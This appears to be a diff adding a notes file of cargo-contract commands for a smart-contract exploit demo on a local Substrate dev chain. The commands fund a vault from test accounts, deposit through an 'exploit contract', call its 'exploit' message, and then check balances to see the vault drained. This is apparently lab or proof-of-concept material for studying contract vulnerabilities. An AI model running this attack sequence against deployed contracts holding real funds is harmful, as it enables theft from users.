@@ -1,0 +1,24 @@
+fund vault contract
+
+cargo contract call --contract 5Dxs2kDNLJW3fY9U8oJEVkM5CskAt3TRyaNBhLoRDZw9G4KD --message deposit --value 1000000 --suri //Alice --skip-confirm
+cargo contract call --contract 5Dxs2kDNLJW3fY9U8oJEVkM5CskAt3TRyaNBhLoRDZw9G4KD --message deposit --value 1000000 --suri //Bob --skip-confirm
+cargo contract call --contract 5Dxs2kDNLJW3fY9U8oJEVkM5CskAt3TRyaNBhLoRDZw9G4KD --message deposit --value 1000000 --suri //Charlie --skip-confirm
+cargo contract call --contract 5Dxs2kDNLJW3fY9U8oJEVkM5CskAt3TRyaNBhLoRDZw9G4KD --message deposit --value 1000000 --suri //Dave --skip-confirm
+
+deposit in vault contract from exploit contract
+cargo contract call --contract 5Fz7Qc98b73MdPeeg6LLp12LtYL1BbVMLiT9C2bxxzt4kPCG --message deposit --value 1000000 --suri //Bob --skip-confirm
+
+execute exploit
+cargo contract call --contract 5Fz7Qc98b73MdPeeg6LLp12LtYL1BbVMLiT9C2bxxzt4kPCG --message exploit --gas 24897828145 --proof-size 463048 --suri //Bob --skip-dry-run --skip-confirm
+
+exploit contract balance
+cargo contract call --contract 5Fz7Qc98b73MdPeeg6LLp12LtYL1BbVMLiT9C2bxxzt4kPCG --message get_balance --suri //Bob --dry-run
+
+view accounts balances
+
+cargo contract call --contract 5Dxs2kDNLJW3fY9U8oJEVkM5CskAt3TRyaNBhLoRDZw9G4KD --message balance --args 5GrwvaEF5zXb26Fz9rcQpDWS57CtERHpNehXCPcNoHGKutQY --suri //Alice --dry-run
+cargo contract call --contract 5Dxs2kDNLJW3fY9U8oJEVkM5CskAt3TRyaNBhLoRDZw9G4KD --message balance --args 5FHneW46xGXgs5mUiveU4sbTyGBzmstUspZC92UhjJM694ty --suri //Bob --dry-run
+cargo contract call --contract 5Dxs2kDNLJW3fY9U8oJEVkM5CskAt3TRyaNBhLoRDZw9G4KD --message balance --args 5FLSigC9HGRKVhB9FiEo4Y3koPsNmBmLJbpXg2mp1hXcS59Y --suri //Charlie --dry-run
+cargo contract call --contract 5Dxs2kDNLJW3fY9U8oJEVkM5CskAt3TRyaNBhLoRDZw9G4KD --message balance --args 5DAAnrj7VHTznn2AWBemMuyBwZWs6FNFjdyVXUeYum3PTXFy --suri //Dave --dry-run
+(exploit contract balance in vault)
+cargo contract call --contract 5Dxs2kDNLJW3fY9U8oJEVkM5CskAt3TRyaNBhLoRDZw9G4KD --message balance --args 5Fz7Qc98b73MdPeeg6LLp12LtYL1BbVMLiT9C2bxxzt4kPCG --suri //Bob --dry-run
